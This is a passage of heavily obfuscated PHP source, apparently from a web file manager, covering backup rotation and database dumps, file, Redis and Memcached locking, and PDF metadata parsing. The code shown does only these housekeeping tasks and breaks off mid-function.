set($f‡ï‰¨»‰) { $FŠ¶Ø¥âœï =& $_SERVER[Ä¿Ş°¨]; $CÒë”Úè† = self::get(); foreach ($f‡ï‰¨»‰ as $EÓƒ¤ ‰Š¶ => $EäñğÒ®) { $F…¾Åî°”¹ = explode($FŠ¶Ø¥âœï[91], $EÓƒ¤ ‰Š¶); $a±–—˜ÛƒÀ = count($F…¾Åî°”¹); switch ($a±–—˜ÛƒÀ) { case 1: $CÒë”Úè†[$F…¾Åî°”¹[0]] = $EäñğÒ®; break; case 2: $CÒë”Úè†[$F…¾Åî°”¹[0]][$F…¾Åî°”¹[1]] = $EäñğÒ®; break; case 3: $CÒë”Úè†[$F…¾Åî°”¹[0]][$F…¾Åî°”¹[1]][$F…¾Åî°”¹[2]] = $EäñğÒ®; break; } } Model($FŠ¶Ø¥âœï[682])->update($CÒë”Úè†[$FŠ¶Ø¥âœï[372]], $CÒë”Úè†); self::$option = $CÒë”Úè†; return self::$option; } public function keep() { $A±³¡«Ã‡ =& $_SERVER[Ä¿Ş°¨]; $fÙ†åÂì¡ = self::get(); if ($fÙ†åÂì¡[$A±³¡«Ã‡[277]][$A±³¡«Ã‡[687]][$A±³¡«Ã‡[683]] == $A±³¡«Ã‡[83]) { return; } $this->backupKeep($fÙ†åÂì¡); self::set(array($A±³¡«Ã‡[699] => 1)); } private function backupKeep($C¯‹Ä««ó) { goto FÆ°æ˜¨ñ¬; C„Éãêğá: $B•È¿´ª­ = 0; $dß”ÌèŸí£ = array(); foreach ($e±£ñÚ— as $a”–˜«º£°) { if ($B•È¿´ª­ >= 7) { break; } $dß”ÌèŸí£[] = $a”–˜«º£°[$fŒ˜Á‡ÀŸÆ[28]]; $B•È¿´ª­++; } goto d‰¿××„”í; FÆ°æ˜¨ñ¬: $fŒ˜Á‡ÀŸÆ =& $_SERVER[Ä¿Ş°¨]; $e±£ñÚ— = Model($fŒ˜Á‡ÀŸÆ[682])->listData(); if (empty($e±£ñÚ—)) { return; } goto C„Éãêğá; d‰¿××„”í: for ($B•È¿´ª­ = 0; $B•È¿´ª­ < 12; $B•È¿´ª­++) { $dß”ÌèŸí£[] = date($fŒ˜Á‡ÀŸÆ[700], strtotime("\x2d{$B•È¿´ª­}\40\x6d\157\x6e\x74\x68\163")); } $dß”ÌèŸí£ = array_unique($dß”ÌèŸí£); foreach ($e±£ñÚ— as $a”–˜«º£°) { if (!empty($a”–˜«º£°[$fŒ˜Á‡ÀŸÆ[28]]) && in_array($a”–˜«º£°[$fŒ˜Á‡ÀŸÆ[28]], $dß”ÌèŸí£)) { continue; } Model($fŒ˜Á‡ÀŸÆ[682])->remove($a”–˜«º£°[$fŒ˜Á‡ÀŸÆ[372]]); $cÆ­ÛÁ†åë = "\x7b\151\x6f\72{$C¯‹Ä««ó[$fŒ˜Á‡ÀŸÆ[685]]}\175\57\144\141\164\x61\142\141\163\x65\57\142\141\x63\x6b\165\x70\137{$a”–˜«º£°[$fŒ˜Á‡ÀŸÆ[28]]}"; IO::remove($cÆ­ÛÁ†åë, !1); } goto AÅ­âÀ¾Ó“; AÅ­âÀ¾Ó“: } public function db() { goto a×¿ö»æ; fêƒ¹¶Ç—ô: return !0; goto eÜ¥™œ ‚; A«•†ÌİŞ: $CîŸ¦ÜÜò = new BackupDb(); if (!$CîŸ¦ÜÜò->index()) { return !1; } self::set(array($A¹†¤ ùÑª[701] => 1)); goto fêƒ¹¶Ç—ô; a×¿ö»æ: $A¹†¤ ùÑª =& $_SERVER[Ä¿Ş°¨]; $aÊ×¿­øŠ = self::get(); if ($aÊ×¿­øŠ[$A¹†¤ ùÑª[277]][$A¹†¤ ùÑª[688]][$A¹†¤ ùÑª[683]] == $A¹†¤ ùÑª[83]) { return !0; } goto A«•†ÌİŞ; eÜ¥™œ ‚: } public function dbFile() { goto AÛŒôòÌ¸; d‡öÕÓ¡: return !0; goto aÆä°âËæˆ; AÛŒôòÌ¸: $aãš™Âƒ«³ =& $_SERVER[Ä¿Ş°¨]; $b¿›”™Æƒ¥ = self::get(); if ($b¿›”™Æƒ¥[$aãš™Âƒ«³[277]][$aãš™Âƒ«³[691]][$aãš™Âƒ«³[683]] == $aãš™Âƒ«³[83]) { return !0; } goto cì„Û¿¦Ë¬; cì„Û¿¦Ë¬: $a±‹­‘—×¹ = new BackupDbFile(); if (!$a±‹­‘—×¹->index()) { return !1; } self::set(array($aãš™Âƒ«³[702] => 1)); goto d‡öÕÓ¡; aÆä°âËæˆ: } public function file() { $aÉ¶¡Š’Ë =& $_SERVER[Ä¿Ş°¨]; $A«âÎ©–Æ› = self::get(); if ($A«âÎ©–Æ›[$aÉ¶¡Š’Ë[277]][$aÉ¶¡Š’Ë[163]][$aÉ¶¡Š’Ë[683]] == $aÉ¶¡Š’Ë[83]) { return !0; } if (!isset($A«âÎ©–Æ›[$aÉ¶¡Š’Ë[686]]) || $A«âÎ©–Æ›[$aÉ¶¡Š’Ë[686]] == $aÉ¶¡Š’Ë[472]) { $Fª–ŸÅÁÔô = new BackupFile(); if (!$Fª–ŸÅÁÔô->index()) { return !1; } } self::set(array($aÉ¶¡Š’Ë[703] => 1, $aÉ¶¡Š’Ë[683] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto DÑô·áº¤¹; b’ÏÍæ˜¾: $a„Ÿí‰ÏŸœ = new DbManage($DÈã¶ºŒª , $dŠïËÛ¹ò¾); $e½â”‰ÜÉ = TEMP_FILES . $cö ó½‹ç²[704] . self::$name . $cö ó½‹ç²[8]; del_dir($e½â”‰ÜÉ); goto aªÖÍ‰ì‹õ; b†ÜÊŠê‚á: self::$name = $eá¥Ùçí’[$cö ó½‹ç²[28]]; $DÈã¶ºŒª  = $GLOBALS[$cö ó½‹ç²[6]][$cö ó½‹ç²[17]]; $dŠïËÛ¹ò¾ = $this->_dbType($DÈã¶ºŒª ); goto b’ÏÍæ˜¾; aªÖÍ‰ì‹õ: mk_dir($e½â”‰ÜÉ); $Dñóïøá˜š = $a„Ÿí‰ÏŸœ->db()->getTables(); $cÃêôæ§ª = 0; goto d¨‚ÂëÂ; fööå‡ÚèÆ: return !0; goto bÑ°¤Éëå‰; DÑô·áº¤¹: $cö ó½‹ç² =& $_SERVER[Ä¿Ş°¨]; $eá¥Ùçí’ = Backup::get(); self::$io = $eá¥Ùçí’[$cö ó½‹ç²[685]]; goto b†ÜÊŠê‚á; aÒğê®Òø: $B–øÛÄê£…->end(); $CìğÊ•âÊì = array($cö ó½‹ç²[714] => $dŠïËÛ¹ò¾, $cö ó½‹ç²[701] => 1, $cö ó½‹ç²[715] => $cÃêôæ§ª, $cö ó½‹ç²[716] => $cÃêôæ§ª); Backup::set($CìğÊ•âÊì); goto fööå‡ÚèÆ; d¨‚ÂëÂ: $B–øÛÄê£… = new Task($cö ó½‹ç²[705], $cö ó½‹ç²[706], 0, LNG($cö ó½‹ç²[707]) . $cö ó½‹ç²[708] . LNG($cö ó½‹ç²[709])); $Dñóïøá˜š = array_diff($Dñóïøá˜š, array($cö ó½‹ç²[710], $cö ó½‹ç²[711])); foreach ($Dñóïøá˜š as $AªßÈ´¦°) { $EŸÓ–‚½† = $e½â”‰ÜÉ . $AªßÈ´¦° . $cö ó½‹ç²[712]; $D“ğéæù×ğ = null; if ($AªßÈ´¦° == $cö ó½‹ç²[713] && (!isset($eá¥Ùçí’[$cö ó½‹ç²[686]]) || $eá¥Ùçí’[$cö ó½‹ç²[686]] == $cö ó½‹ç²[472])) { $D“ğéæù×ğ = self::$io; } $cÃêôæ§ª += $a„Ÿí‰ÏŸœ->sqlFromDb($AªßÈ´¦°, $EŸÓ–‚½†, $B–øÛÄê£…, $D“ğéæù×ğ); } goto aÒğê®Òø; bÑ°¤Éëå‰: } private function _dbType($CæİÚó¯¶‰) { goto EŠ¿ãÌè«¸; C†µÈÜÀ¼©: return $B·æÜƒˆÀŞ; goto a·½Æ§‡¿Ê; b¼…Ü’ÔŠ„: if ($B·æÜƒˆÀŞ == $A’Î¦Ş·ÅÜ[718]) { $cÈ‹±×Ä™„ = explode($A’Î¦Ş·ÅÜ[4], $CæİÚó¯¶‰[$A’Î¦Ş·ÅÜ[719]]); $B·æÜƒˆÀŞ = $cÈ‹±×Ä™„[0]; } $Aø«Ü¿ÉØ¿ = array($A’Î¦Ş·ÅÜ[720] => $A’Î¦Ş·ÅÜ[9], $A’Î¦Ş·ÅÜ[721] => $A’Î¦Ş·ÅÜ[722]); if (isset($Aø«Ü¿ÉØ¿[$B·æÜƒˆÀŞ])) { $B·æÜƒˆÀŞ = $Aø«Ü¿ÉØ¿[$B·æÜƒˆÀŞ]; } goto C†µÈÜÀ¼©; EŠ¿ãÌè«¸: $A’Î¦Ş·ÅÜ =& $_SERVER[Ä¿Ş°¨]; $CæİÚó¯¶‰ = array_change_key_case($CæİÚó¯¶‰); $B·æÜƒˆÀŞ = $CæİÚó¯¶‰[$A’Î¦Ş·ÅÜ[717]]; goto b¼…Ü’ÔŠ„; a·½Æ§‡¿Ê: } } goto A„­«õ’˜“; aÅÀ‰ÄÔÕ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $BÓÇ•Œ‘ä =& $_SERVER[Ä¿Ş°¨]; $c¶Íñ¦­±Ÿ = $GLOBALS[$BÓÇ•Œ‘ä[6]][$BÓÇ•Œ‘ä[333]]; self::$cachePath = $c¶Íñ¦­±Ÿ[$BÓÇ•Œ‘ä[163]][$BÓÇ•Œ‘ä[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($DÇ£¨†‚“’, $EÄÀÏñÖİÈ = 0) { goto A…¾Áš¿‹; D¶„±°ÓßÔ: $dğ‘ÉÏ²  = rtrim(self::$cachePath, $A‰Åâ²Ñ…[8]) . $A‰Åâ²Ñ…[766] . md5($DÇ£¨†‚“’) . $A‰Åâ²Ñ…[767]; if (file_exists($dğ‘ÉÏ² ) && filemtime($dğ‘ÉÏ² ) && filemtime($dğ‘ÉÏ² ) < time() - 10) { @unlink($dğ‘ÉÏ² ); } do { if (file_exists($dğ‘ÉÏ² )) { cacheLockWait(); continue; } $aáª‰…ƒé = fopen($dğ‘ÉÏ² , $A‰Åâ²Ñ…[768]); if (!$aáª‰…ƒé) { return !1; } $dõ£œ·‡å¾ = flock($aáª‰…ƒé, LOCK_EX | LOCK_NB); self::$caches[$DÇ£¨†‚“’] = array($A‰Åâ²Ñ…[769] => $aáª‰…ƒé, $A‰Åâ²Ñ…[163] => $dğ‘ÉÏ² ); fwrite($aáª‰…ƒé, $aá¢Æ¢æ‘); clearstatcache(); if ($aáª‰…ƒé && $dõ£œ·‡å¾) { return !0; } cacheLockWait(); } while (microtime(!0) < $aá¢Æ¢æ‘); goto Bìâ–¸„É‡; A…¾Áš¿‹: $A‰Åâ²Ñ… =& $_SERVER[Ä¿Ş°¨]; $EáÛ¶¾ = microtime(!0); $aá¢Æ¢æ‘ = $EáÛ¶¾ + $EÄÀÏñÖİÈ + 0.0001; goto D¶„±°ÓßÔ; Bìâ–¸„É‡: $this->unlock($DÇ£¨†‚“’); return !1; goto d……­®çµÌ; d……­®çµÌ: } public function lockGet($b¯ˆ¼†‹‰¿) { $BÏÓ³Š¹ =& $_SERVER[Ä¿Ş°¨]; $E‘İŞ«İ•” = rtrim(self::$cachePath, $BÏÓ³Š¹[8]) . $BÏÓ³Š¹[766] . md5($b¯ˆ¼†‹‰¿) . $BÏÓ³Š¹[767]; return file_exists($E‘İŞ«İ•”); } public function unlock($F†„¡ÜŸî) { goto b¥Ò‡†èÏ£; E®•²“‚Ì¡: @flock($eå¥²É¿ƒÙ[$bæœáÏÔ¸‹[769]], LOCK_UN); @fclose($eå¥²É¿ƒÙ[$bæœáÏÔ¸‹[769]]); @unlink($eå¥²É¿ƒÙ[$bæœáÏÔ¸‹[163]]); goto E‰‰”Ù‡ô; E‰‰”Ù‡ô: unset(self::$caches[$F†„¡ÜŸî]); goto BÌ¬Šà¯Æ…; b¥Ò‡†èÏ£: $bæœáÏÔ¸‹ =& $_SERVER[Ä¿Ş°¨]; $eå¥²É¿ƒÙ = self::$caches[$F†„¡ÜŸî]; if (!$eå¥²É¿ƒÙ) { return; } goto E®•²“‚Ì¡; BÌ¬Šà¯Æ…: } } class CacheLockRedis { public function lock($f»ƒçŞ†ì, $dÔîÎÏ¼¢Û = 10) { $f¢²ˆ¬¾ = Cache::init(); $d·õ‡ª­İ = microtime(!0) + $dÔîÎÏ¼¢Û; while (microtime(!0) < $d·õ‡ª­İ) { $Aéß—³ÍîÌ = $f¢²ˆ¬¾->get($f»ƒçŞ†ì); if (!$Aéß—³ÍîÌ) { $a½ñî«¹ = $f¢²ˆ¬¾->setLock($f»ƒçŞ†ì, $d·õ‡ª­İ, $dÔîÎÏ¼¢Û); if ($a½ñî«¹) { return !0; } } else { if ($Aéß—³ÍîÌ < microtime(!0)) { $f¢²ˆ¬¾->set($f»ƒçŞ†ì, $d·õ‡ª­İ, $d·õ‡ª­İ); if ($f¢²ˆ¬¾->get($f»ƒçŞ†ì) === $Aéß—³ÍîÌ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C¸óÅŠ“Ğ) { return Cache::init()->get($C¸óÅŠ“Ğ); } public function unlock($f¥£·éá³) { return Cache::init()->remove($f¥£·éá³); } } class CacheLockMemcached { public function lock($fÕº£«®ƒ“, $A¨çæéïØ = 0) { $D§Ì‹Şğ…² = Cache::init(); $E¤Ì‹å¯Ää = microtime(!0) + $A¨çæéïØ; while (microtime(!0) < $E¤Ì‹å¯Ää) { $DŒÁÉ±”ŒŞ = $D§Ì‹Şğ…²->get($fÕº£«®ƒ“); if (!$DŒÁÉ±”ŒŞ || $DŒÁÉ±”ŒŞ < microtime(!0)) { $DÆ°Š‰ãê = $D§Ì‹Şğ…²->handle->add($fÕº£«®ƒ“, $E¤Ì‹å¯Ää, $A¨çæéïØ); if ($DÆ°Š‰ãê) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($b‘ß‚Êš’¹) { return Cache::init()->get($b‘ß‚Êš’¹); } public function unlock($EÄ‰÷îõµµ) { return Cache::init()->remove($EÄ‰÷îõµµ); } } goto B¾ßÖËÀÊ; D ’’¼å´: class FileParsePdf { public static function parse($bĞï¨©Óç) { goto C Ú¤×È“; eŒÛ‰ˆµ©™: preg_match($aËòïÎ£ãÖ, $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1492]], $d’íÕö’¸£); if (!$f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1494]] && count($d’íÕö’¸£) == 5) { $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1494]] = $d’íÕö’¸£[3]; $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1496]] = $d’íÕö’¸£[4]; } preg_match($DÏ›ô§Â¢ë[1497], $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1491]], $d’íÕö’¸£); goto EÁ³İ‡åŞ; dƒèø—Ÿ: preg_match_all($aËòïÎ£ãÖ, $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1491]], $d’íÕö’¸£); if ($d’íÕö’¸£[1] && $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1498]] < $d’íÕö’¸£[1][0]) { $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1498]] = $d’íÕö’¸£[1][0]; } preg_match_all($aËòïÎ£ãÖ, $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1492]], $d’íÕö’¸£); goto CÕ™Ë’ß; C Ú¤×È“: $DÏ›ô§Â¢ë =& $_SERVER[Ä¿Ş°¨]; $CíÛÊÙ‘Û = 32 * 1024; $a«©Ûõ°ÌÃ = array($DÏ›ô§Â¢ë[769] => fopen($bĞï¨©Óç, $DÏ›ô§Â¢ë[1147]), $DÏ›ô§Â¢ë[75] => $bĞï¨©Óç, $DÏ›ô§Â¢ë[77] => filesize($bĞï¨©Óç), $DÏ›ô§Â¢ë[1490] => $CíÛÊÙ‘Û); goto fßº×”¤×¨; B‘ªŠÅ´Ë: if ($b•–Î†·†ñ) { $DêõŞÌğš‘ = $b•–Î†·†ñ[$DÏ›ô§Â¢ë[1493]][$DÏ›ô§Â¢ë[1169]]; $f¨”°Ñ’÷œ = self::getObjectValue($a«©Ûõ°ÌÃ, $b•–Î†·†ñ, $DêõŞÌğš‘); } $f¨”°Ñ’÷œ = is_array($f¨”°Ñ’÷œ) ? $f¨”°Ñ’÷œ : array(); $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1494]] = 0; goto C¯èÂ³´„ì; C¯èÂ³´„ì: $aËòïÎ£ãÖ = $DÏ›ô§Â¢ë[1495]; preg_match($aËòïÎ£ãÖ, $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1491]], $d’íÕö’¸£); if (!$f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1494]] && count($d’íÕö’¸£) == 5) { $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1494]] = $d’íÕö’¸£[3]; $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1496]] = $d’íÕö’¸£[4]; } goto eŒÛ‰ˆµ©™; fßº×”¤×¨: $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1491]] = StreamWrapperIO::read($bĞï¨©Óç, 0, $CíÛÊÙ‘Û); $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[1492]] = StreamWrapperIO::read($bĞï¨©Óç, $a«©Ûõ°ÌÃ[$DÏ›ô§Â¢ë[77]] - $CíÛÊÙ‘Û, $CíÛÊÙ‘Û); $b•–Î†·†ñ = self::decodeXref($a«©Ûõ°ÌÃ); goto B‘ªŠÅ´Ë; EÁ³İ‡åŞ: if ($d’íÕö’¸£) { $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1303]] = $d’íÕö’¸£[1]; } $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1498]] = 0; $aËòïÎ£ãÖ = $DÏ›ô§Â¢ë[1499]; goto dƒèø—Ÿ; CÕ™Ë’ß: if ($d’íÕö’¸£[1] && $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1498]] < $d’íÕö’¸£[1][0]) { $f¨”°Ñ’÷œ[$DÏ›ô§Â¢ë[1498]] = $d’íÕö’¸£[1][0]; } $f¨”°Ñ’÷œ = self::parseInfoItem($f¨”°Ñ’÷œ); return $f¨”°Ñ’÷œ; goto aÇ®Ééß°µ; aÇ®Ééß°µ: } private static function parseInfoItem($fÚ¨‹§Œ‚) { $c²ÅÈã‰ñê =& $_SERVER[Ä¿Ş°¨]; if (!$fÚ¨‹§Œ‚) { return !1; } $CÆˆÎÍáâ = array($c²ÅÈã‰ñê[1304] => array($c²ÅÈã‰ñê[1500], $c²ÅÈã‰ñê[33]), $c²ÅÈã‰ñê[1501] => array($c²ÅÈã‰ñê[1502], $c²ÅÈã‰ñê[33]), $c²ÅÈã‰ñê[183] => array($c²ÅÈã‰ñê[1503], $c²ÅÈã‰ñê[206]), $c²ÅÈã‰ñê[106] => array($c²ÅÈã‰ñê[1504], $c²ÅÈã‰ñê[206]), $c²ÅÈã‰ñê[1498] => array($c²ÅÈã‰ñê[1498], $c²ÅÈã‰ñê[272]), $c²ÅÈã‰ñê[1494] => array($c²ÅÈã‰ñê[1494], $c²ÅÈã‰ñê[272]), $c²ÅÈã‰ñê[1496] => array($c²ÅÈã‰ñê[1496], $c²ÅÈã‰ñê[272]), $c²ÅÈã‰ñê[1505] => array($c²ÅÈã‰ñê[1506], $c²ÅÈã‰ñê[33]), $c²ÅÈã‰ñê[1507] => array($c²ÅÈã‰ñê[1508], $c²ÅÈã‰ñê[33]), $c²ÅÈã‰ñê[1509] => array($c²ÅÈã‰ñê[1303], $c²ÅÈã‰ñê[33])); $e¸Ú†¨¶ƒ = array(); foreach ($CÆˆÎÍáâ as $DŒ£¢è‹è => $fÄ‰ÉÄêÛ) { if (!isset($fÚ¨‹§Œ‚[$fÄ‰ÉÄêÛ[0]])) { continue; } $eÄÌÍœ Ç = $fÚ¨‹§Œ‚[$fÄ‰ÉÄêÛ[0]]; if (!$eÄÌÍœ Ç || is_array($eÄÌÍœ Ç)) { continue; } switch ($fÄ‰ÉÄêÛ[1]) { case $c²ÅÈã‰ñê[272]: $eÄÌÍœ Ç = intval($eÄÌÍœ Ç); break; case $c²ÅÈã‰ñê[206]: if (substr($eÄÌÍœ Ç, 0, 2) == $c²ÅÈã‰ñê[1510]) { $eÄÌÍœ Ç = substr($eÄÌÍœ Ç, 2, 14); } if (strtotime($eÄÌÍœ Ç)) { $eÄÌÍœ Ç = date($c²ÅÈã‰ñê[1511], strtotime($eÄÌÍœ Ç)); } break; } $e¸Ú†¨¶ƒ[$DŒ£¢è‹è] = $eÄÌÍœ Ç; } return $e¸Ú†¨¶ƒ; } private static function decodeXref(&$C†È¡Ÿãà¹) { goto C¿‰öìÖœ; có®¼ïíÔ: $cÂÓÖ­ƒŞÊ = $D¾–•¬µ¡Ü[1513]; if (!preg_match_all($cÂÓÖ­ƒŞÊ, $a­ª´ñîñ, $aŸ¨Æñ‰‡µ, PREG_SET_ORDER, 0)) { return !1; } $bóÉà‹¹ó = intval($aŸ¨Æñ‰‡µ[0][1]); goto dÌ§á¨àÍ; C¿‰öìÖœ: $D¾–•¬µ¡Ü =& $_SERVER[Ä¿Ş°¨]; $a­ª´ñîñ = $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1492]]; $CÕ¤—õë = array($D¾–•¬µ¡Ü[1493] => array(), $D¾–•¬µ¡Ü[1512] => array()); goto có®¼ïíÔ; Dë‘‚Ô®™: if (preg_match($D¾–•¬µ¡Ü[1524], $Bê†Åøç¥Œ, $aŸ¨Æñ‰‡µ) > 0) { $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[1169]] = intval($aŸ¨Æñ‰‡µ[1]) . $D¾–•¬µ¡Ü[70] . intval($aŸ¨Æñ‰‡µ[2]); } if (preg_match($D¾–•¬µ¡Ü[1525], $Bê†Åøç¥Œ, $aŸ¨Æñ‰‡µ) > 0) { $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[372]] = array(); $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[372]][0] = $aŸ¨Æñ‰‡µ[1]; $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[372]][1] = $aŸ¨Æñ‰‡µ[2]; } if (!$CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[1169]]) { return !1; } goto e’ÆÂõ‘Í­; F‡­Ûº¬‚·: if (preg_match($D¾–•¬µ¡Ü[1519], $Bê†Åøç¥Œ, $aŸ¨Æñ‰‡µ) > 0) { $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[77]] = intval($aŸ¨Æñ‰‡µ[1]); } if (preg_match($D¾–•¬µ¡Ü[1520], $Bê†Åøç¥Œ, $aŸ¨Æñ‰‡µ) > 0) { $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[1521]] = intval($aŸ¨Æñ‰‡µ[1]) . $D¾–•¬µ¡Ü[70] . intval($aŸ¨Æñ‰‡µ[2]); } if (preg_match($D¾–•¬µ¡Ü[1522], $Bê†Åøç¥Œ, $aŸ¨Æñ‰‡µ) > 0) { $CÕ¤—õë[$D¾–•¬µ¡Ü[1493]][$D¾–•¬µ¡Ü[1523]] = intval($aŸ¨Æñ‰‡µ[1]) . $D¾–•¬µ¡Ü[70] . intval($aŸ¨Æñ‰‡µ[2]); } goto Dë‘‚Ô®™; F÷¼šŸˆ‡Ì: foreach ($aŸ¨Æñ‰‡µ[3] as $bÅš¯×š†å => $aˆ’î’æ¦£) { if ($aŸ¨Æñ‰‡µ[3][$bÅš¯×š†å] == $D¾–•¬µ¡Ü[1515]) { $aÔïìİ²Ú = $CÔõ‹‹ÛÑã . $D¾–•¬µ¡Ü[70] . intval($aŸ¨Æñ‰‡µ[2][$bÅš¯×š†å]); $CÕ¤—õë[$D¾–•¬µ¡Ü[1512]][$aÔïìİ²Ú] = intval($aŸ¨Æñ‰‡µ[1][$bÅš¯×š†å]); ++$CÔõ‹‹ÛÑã; } else { if ($aŸ¨Æñ‰‡µ[3][$bÅš¯×š†å] == $D¾–•¬µ¡Ü[1516]) { ++$CÔõ‹‹ÛÑã; } else { } } } if (preg_match_all($D¾–•¬µ¡Ü[1517], $a­ª´ñîñ, $aŸ¨Æñ‰‡µ)) { $fõ–¢İ»¶å = $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[77]] - $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1490]]; foreach ($aŸ¨Æñ‰‡µ[0] as $bÅš¯×š†å => $f†²»¶»Ñ¡) { $bµ—»¦¸ = $aŸ¨Æñ‰‡µ[1][$bÅš¯×š†å] . $D¾–•¬µ¡Ü[70] . $aŸ¨Æñ‰‡µ[2][$bÅš¯×š†å]; $CÕ¤—õë[$D¾–•¬µ¡Ü[1512]][$bµ—»¦¸] = strpos($a­ª´ñîñ, $f†²»¶»Ñ¡) + $fõ–¢İ»¶å + 1; } } if (preg_match_all($D¾–•¬µ¡Ü[1518], $a­ª´ñîñ, $aŸ¨Æñ‰‡µ)) { $Bê†Åøç¥Œ = count($aŸ¨Æñ‰‡µ[1]) == 1 ? $aŸ¨Æñ‰‡µ[1][0] : $aŸ¨Æñ‰‡µ[1][1]; } else { $Bê†Åøç¥Œ = substr($a­ª´ñîñ, -1024 * 5); } goto F‡­Ûº¬‚·; dÌ§á¨àÍ: if ($C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[77]] - $bóÉà‹¹ó > $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1490]]) { $C§«ÓöÄƒ = 4 * $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1490]]; $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1490]] = $C§«ÓöÄƒ; $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1491]] = StreamWrapperIO::read($C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[75]], 0, $C§«ÓöÄƒ); $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1492]] = StreamWrapperIO::read($C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[75]], $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[77]] - $C§«ÓöÄƒ, $C§«ÓöÄƒ); $a­ª´ñîñ = $C†È¡Ÿãà¹[$D¾–•¬µ¡Ü[1492]]; } $CÔõ‹‹ÛÑã = 0; preg_match_all($D¾–•¬µ¡Ü[1514], $a­ª´ñîñ, $aŸ¨Æñ‰‡µ); goto F÷¼šŸˆ‡Ì; e’ÆÂõ‘Í­: if (preg_match($D¾–•¬µ¡Ü[1526], $Bê†Åøç¥Œ, $aŸ¨Æñ‰‡µ) > 0) { } return $CÕ¤—õë; goto b¯á£½‡ Ç; b¯á£½‡ Ç: } private static function getObjectValue($C½ù´•Ú‹‰, $bğ¦Ú· «Á, $C‚–îí£ŞÎ) { goto Aë½ñ´­ø¬; c¥¤ã·Ö†î: if (!is_array($c¹‰æòÄÈÔ[1])) { return array(); } $d áÊ¨’¼… = array(); for ($C·Âóêè¿ = 0; $C·Âóêè¿ < count($c¹‰æòÄÈÔ[1]); $C·Âóêè¿ += 2) { $fÙ“Õõ‘ÛÄ = $c¹‰æòÄÈÔ[1][$C·Âóêè¿]; $bİ¼ËÉ‡Ú = $c¹‰æòÄÈÔ[1][$C·Âóêè¿ + 1]; if (count($fÙ“Õõ‘ÛÄ) == 3 && $fÙ“Õõ‘ÛÄ[0] == $eÕæîÓÏ©[8]) { $fÅ¾Œ‡ˆ‹¯ = !1; if ($bİ¼ËÉ‡Ú[0] == $eÕæîÓÏ©[1527]) { $bİ¼ËÉ‡Ú = self::getObject($C½ù´•Ú‹‰, $bğ¦Ú· «Á[$eÕæîÓÏ©[1512]][$bİ¼ËÉ‡Ú[1]]); } $fÅ¾Œ‡ˆ‹¯ = $bİ¼ËÉ‡Ú[1]; if ($fÅ¾Œ‡ˆ‹¯ === !1) { continue; } if (is_string($fÅ¾Œ‡ˆ‹¯)) { $fÅ¾Œ‡ˆ‹¯ = self::decodeStr($fÅ¾Œ‡ˆ‹¯); } $d áÊ¨’¼…[$fÙ“Õõ‘ÛÄ[1]] = $fÅ¾Œ‡ˆ‹¯; } } goto aî„›Ë›Ù¦; Aë½ñ´­ø¬: $eÕæîÓÏ© =& $_SERVER[Ä¿Ş°¨]; $c¹‰æòÄÈÔ = self::getObject($C½ù´•Ú‹‰, $bğ¦Ú· «Á[$eÕæîÓÏ©[1512]][$C‚–îí£ŞÎ]); if (is_string($c¹‰æòÄÈÔ[1])) { return $c¹‰æòÄÈÔ[1]; } goto c¥¤ã·Ö†î; aî„›Ë›Ù¦: return $d áÊ¨’¼…; goto eÑ Úâ¨ã¬; eÑ Úâ¨ã¬: } private static function getObject($cÒ’ØêêŸô, $FñÛ¶ÁçÄÊ) { $BÆóĞÚ¶™— = self::getObjectItem($cÒ’ØêêŸô, $FñÛ¶ÁçÄÊ); $BÆóĞÚ¶™— = self::getObjectItem($cÒ’ØêêŸô, $BÆóĞÚ¶™—[2]); return $BÆóĞÚ¶™—; } private static function getObjectItem($e­ê—ˆ¾ŸÙ, $cÓê¸äÆŒî) { goto C‘Š•¹”Œ; F‹¢ì—ÓÆ: $C°•Üàë®î = self::getRawObject($d„¶Œ£´©Š, $e¹Ï¡Õ“µŞ); if ($cÓê¸äÆŒî >= $FÂê‰µ¡î‘) { $C°•Üàë®î[2] = 